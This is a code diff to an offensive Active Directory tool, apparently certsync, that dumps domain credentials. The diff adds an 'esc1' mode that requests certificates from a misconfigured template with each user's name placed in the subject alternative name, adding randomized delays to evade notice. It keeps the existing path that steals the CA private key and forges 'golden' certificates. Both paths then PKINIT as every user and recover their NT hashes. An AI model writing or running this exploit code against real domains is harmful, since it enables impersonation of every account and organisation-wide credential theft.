@@ -17,6 +17,7 @@ from certipy.lib.ldap import LDAPEntry, LDAPConnection
 from certipy.lib.rpc import get_dce_rpc
 from certipy.commands.ca import CA
 from certipy.commands.auth import Authenticate
+from certipy.commands.req import Request
 from certipy.lib.certificate import (
     PRINCIPAL_NAME,
     UTF8String,
@@ -29,7 +30,82 @@ from certipy.lib.certificate import (
     get_subject_from_str,
     load_pfx,
     x509,
+    rsa,
+    create_csr,
+    csr_to_der,
 )
+
+class MinifiedRequest(Request):
+    def __init__(
+            self,
+            target: Target = None,
+            ca: str = None,
+            template: str = None,
+            upn: str = None,
+            key: rsa.RSAPrivateKey = None,
+            key_size: int = 2048,
+            ):
+        
+        self.cert = None
+        self.key = None
+        
+        self.target = target
+        self.ca = ca
+        self.template = template
+        self.alt_upn = upn
+        self.key_size = key_size
+        self.key = key
+        self.request_id = 0
+        
+        self._dce = None
+        self._interface = None
+
+        self.web = False
+        self.dynamic = False
+        self.verbose = False
+
+    def set_upn(self, upn) -> bool:
+        try:
+            self.alt_upn = upn
+            return True
+        except:
+            return False
+        
+    def request(self) -> bool:
+        username = self.target.username
+
+        renewal_cert = None
+        renewal_key = None
+
+        csr, key = create_csr(
+            username,
+            alt_upn=self.alt_upn,
+            key=self.key,
+            key_size=self.key_size
+        )
+        self.key = key
+
+        csr = csr_to_der(csr)
+
+        attributes = ["CertificateTemplate:%s" % self.template]
+
+        if self.alt_upn is not None:
+            san = []
+            if self.alt_upn:
+                san.append("upn=%s" % self.alt_upn)
+
+            attributes.append("SAN:%s" % "&".join(san))
+
+        cert = self.interface.request(csr, attributes)
+
+        if cert is False:
+            logging.error("Failed to request certificate")
+            return False
+
+        self.cert = cert
+        self.key = key
+
+        return True
 
 class User:
     def __init__(self, samaccountname, sid, domain):
@@ -63,6 +139,10 @@ class User:
         )
         cert = cert.sign(ca_key, signature_hash_algorithm())
 
+        self.cert = cert
+        self.key = key
+    
+    def set_cert(self, cert, key):
         self.cert = cert
         self.key = key
 
@@ -123,6 +203,7 @@ class CertSync:
             target_ip = options.dc_ip,
             remote_name = options.kdcHost)
 
+        self.action = options.action
         self.ca_ip = options.ca_ip
         self.user_search_filter = options.ldap_filter
         self.scheme = options.scheme
@@ -136,6 +217,7 @@ class CertSync:
         self.ca_cert = None
         self.ca_p12 = None
         self.file = None
+        self.template = options.template if options.template is not None else "SubCA" 
         self.template_pfx = None
         self.template_key = None
         self.template_cert = None
@@ -153,9 +235,10 @@ class CertSync:
                 self.ca_pfx = f.read()
         
         if options.template is not None:
-            with open(options.template, "rb") as f:
-                self.template_pfx = f.read()
-                self.template_key, self.template_cert = load_pfx(self.template_pfx)
+            if self.action == "golden":
+                with open(options.template, "rb") as f:
+                    self.template_pfx = f.read()
+                    self.template_key, self.template_cert = load_pfx(self.template_pfx)
         if options.k:
             principal = get_kerberos_principal()
             if principal:
@@ -168,6 +251,8 @@ class CertSync:
         self.ldap_connection.connect()
 
     def run(self):
+        golden = self.action == "golden"
+
         logging.getLogger("impacket").disabled = True
         logging.getLogger("certipy").disabled = True
 
@@ -203,14 +288,12 @@ class CertSync:
             
         self.ca_name = ca.get("name")
         self.crl = self.get_crl(self.ca_name)[0].get("distinguishedName")
-        
-        # 2. Dumping CA PKI
-        if self.ca_pfx is None:
-            self.ca_dns_name = ca.get("dNSHostName")
-            self.ca_ip_address = self.target.resolver.resolve(self.ca_dns_name)
-            logging.info("Found CA %s on %s(%s)" % (self.ca_name, self.ca_dns_name, self.ca_ip_address))
-            logging.info("Dumping CA certificate and private key")
-            ca_target = Target.create(
+
+        self.ca_dns_name = ca.get("dNSHostName")
+        self.ca_ip_address = self.target.resolver.resolve(self.ca_dns_name)
+        logging.info("Found CA %s on %s(%s)" % (self.ca_name, self.ca_dns_name, self.ca_ip_address))
+
+        ca_target = Target.create(
                 domain = self.target.domain,
                 username = self.target.username,
                 password = self.target.password,
@@ -220,33 +303,48 @@ class CertSync:
                 aes = self.target.aes,
                 remote_name = self.ca_dns_name,
                 no_pass = self.options.no_pass)
-
-            ca_module = CA(target=ca_target, ca=self.ca_name)
-            self.backup_ca_pki(ca_module)
-        else:
-            logging.info("Loading CA certificate and private key from %s" % self.options.ca_pfx)
-            self.ca_key, self.ca_cert = load_pfx(self.ca_pfx)
-
-        if self.ca_key is None or self.ca_cert is None:
-            logging.error("No CA certificate and private key loaded (backup failed or -ca-pfx is not valid). Abort...")
-            sys.exit(1)
-
-        # 3. Forge certificates for each users
-        logging.info("Forging certificates%sfor every users. This can take some time..." % (("based on %s " % self.options.template) if self.template_pfx is not None else " "))
-        if self.randomize:
-            for user in (tqdm(users.values()) if self.options.debug else users.values()):
+        
+        
+        if golden :
+            # Dumping CA PKI
+            if self.ca_pfx is None:
+                ca_module = CA(target=ca_target, ca=self.ca_name)
+                self.backup_ca_pki(ca_module)
+            else:
+                logging.info("Loading CA certificate and private key from %s" % self.options.ca_pfx)
+                self.ca_key, self.ca_cert = load_pfx(self.ca_pfx)
+            if self.ca_key is None or self.ca_cert is None:
+                logging.error("No CA certificate and private key loaded (backup failed or -ca-pfx is not valid). Abort...")
+                sys.exit(1)
+            
+            # Forge certificates for each users
+            logging.info("Forging certificates%sfor every users. This can take some time..." % (("based on %s " % self.options.template) if self.template_pfx is not None else " "))
+            if self.randomize:
+                for user in (tqdm(users.values()) if self.options.debug else users.values()):
+                    base_user_key, base_user_cert = self.forge_cert_base()
+                    try:
+                        user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
+                    except Exception:
+                        pass
+            else:
                 base_user_key, base_user_cert = self.forge_cert_base()
-                try:
-                    user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
-                except Exception:
-                    pass
+                for user in (tqdm(users.values()) if self.options.debug else users.values()):
+                    try:
+                        user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
+                    except Exception:
+                        pass
         else:
-            base_user_key, base_user_cert = self.forge_cert_base()
+            # Request for every user
+            if self.template is None: self.template = "SubCA"
+            request = MinifiedRequest(target = ca_target, ca = self.ca_name, template = self.template, upn=None)
             for user in (tqdm(users.values()) if self.options.debug else users.values()):
-                try:
-                    user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
-                except Exception:
-                    pass
+                sleep(self.timeout + random.randint(0,self.jitter))
+                request.set_upn(user.samaccountname)
+                req = request.request()
+                if not req:
+                    logging.error("Failed to retrieve certificate")
+                else:
+                    user.set_cert(request.cert, request.key)
 
         # 4. PKINIT every users
         logging.info("PKINIT + UnPAC the hashes")
@@ -458,6 +556,7 @@ def main() -> None:
     logger.init()
     version = importlib.metadata.version("certsync")
     parser = argparse.ArgumentParser(description=f"Dump NTDS with golden certificates and UnPAC the hash.\nVersion: {version}", add_help=True)
+    parser.add_argument('action', action="store", help="Action you want to perform : golden, esc1")
     parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
     parser.add_argument(
         "-outputfile",
@@ -580,7 +679,7 @@ def main() -> None:
         action="store",
         metavar="cert.pfx",
         dest="template",
-        help="base template to use in order to forge certificates",
+        help="golden : base template to use in order to forge certificates / esc1 : template to use for requests (Default = SubCA)",
         required=False,
     )
 
@@ -615,6 +714,10 @@ def main() -> None:
         sys.exit(1)
 
     options = parser.parse_args()
+
+    if options.action not in ['golden', 'esc1']:
+        print("Please choose an action between golden and esc1")
+        sys.exit(1)
 
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
